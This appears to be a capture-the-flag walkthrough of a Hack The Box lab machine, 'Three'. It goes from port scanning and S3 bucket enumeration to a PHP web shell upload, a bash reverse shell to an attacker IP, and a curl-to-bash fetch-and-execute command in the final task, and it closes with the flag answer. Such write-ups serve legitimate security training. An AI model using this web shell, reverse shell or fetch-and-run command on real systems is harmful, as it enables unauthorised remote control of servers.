# Three

## Initial Scan

```bash
nmap -sV -T4 -v 10.129.232.222
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-16 18:35 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 18:35
Scanning 10.129.232.222 [2 ports]
Completed Ping Scan at 18:35, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:35
Completed Parallel DNS resolution of 1 host. at 18:35, 0.08s elapsed
Initiating Connect Scan at 18:35
Scanning 10.129.232.222 [1000 ports]
Discovered open port 22/tcp on 10.129.232.222
Discovered open port 80/tcp on 10.129.232.222
Completed Connect Scan at 18:35, 0.71s elapsed (1000 total ports)
Initiating Service scan at 18:35
Scanning 2 services on 10.129.232.222
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 18:35 (0:00:06 remaining)
Completed Service scan at 18:35, 6.11s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.232.222.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.26s elapsed
Initiating NSE at 18:35
Completed NSE at 18:35, 0.20s elapsed
Nmap scan report for 10.129.232.222
Host is up (0.045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```

## Task 1

#### How many TCP ports are open?

Found within the initial scan

Answer: 2

## Task 2

#### What is the domain of the email address provided in the "Contact" section of the website?

We see port 80 open on the target, when browsing the website of the target, going to Contact we see the email address.

<figure><img src="../../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Answer: thetoppers.htb

## Task 3

#### In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

General knowledge. Using the Host file on various systems can be used in lieu of a DNS server if they are hosted internally.

Answer: /etc/hosts

## Task 4

#### Which sub-domain is discovered during further enumeration?

After editing the host file to map the IP to the domain, we can use Gobuster to help enumerate the site.

<figure><img src="../../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

Answer: s3.thetoppers.htb

## Task 5

#### Which service is running on the discovered sub-domain?

Since it's s3 by amazon, also if we google: s3 subdomain

Answer: Amazon S3

## Task 6

#### Which command line utility can be used to interact with the service running on the discovered sub-domain?

Knowing it's amazon S3, what can we use to interact with it? Googling "Interact with Amazon S3" will give us our result

Answer: awscli

## Task 7

#### Which command is used to set up the AWS CLI installation?

`aws help` will give us our answer.

Answer: aws configure

## Task 8

#### What is the command used by the above utility to list all of the S3 buckets?

After configuring aws

<figure><img src="../../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

we can look at the S3 documentation.

Answer: aws s3 ls

## Task 9

#### This server is configured to run files written in what web scripting language?

Looking at the buckets with: `aws --endpoint=http://s3.thetoppers.htb s3 ls`

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

we can go into this further: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

<figure><img src="../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

With this basic info we can see this would use PHP

Answer: PHP

## Task 10

#### Submit Root Flag

So knowing it runs on PHP and with Amazons S3, we are going to work on getting a remote shell. Googling "get shell with php" I see we can use the `system()` function which takes the URL parameter `cmd` as an input and executes it as a system command.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

With the shell file created, we can use `cp` to get the file onto the server and run CMD.

<figure><img src="../../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>

Confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php.

We are met with: `uid=33(www-data) gid=33(www-data) groups=33(www-data)` the output of the OS command `id`.

Now lets make a revershell script

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.119/1337 0>&1
```

<figure><img src="../../../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>

Going to open a netcat shell with `nc -nvlp 1337`&#x20;

<figure><img src="../../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Now open a temp webserver to pull our script from: `python3 -m http.server 8081`&#x20;

<figure><img src="../../../../.gitbook/assets/image (11) (3) (1).png" alt=""><figcaption></figcaption></figure>

Now we can use curl to get our script onto the server and executing it:

http://thetoppers.htb/shell.php?cmd=curl%20%3C10.10.14.119%3E:8081/shell.sh|bash

We now can see our reverse shell:

<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

Now we can locate the flag and cat it's contents

<figure><img src="../../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

Answer: a980d99281a28d638ac68b9bf9453c2b
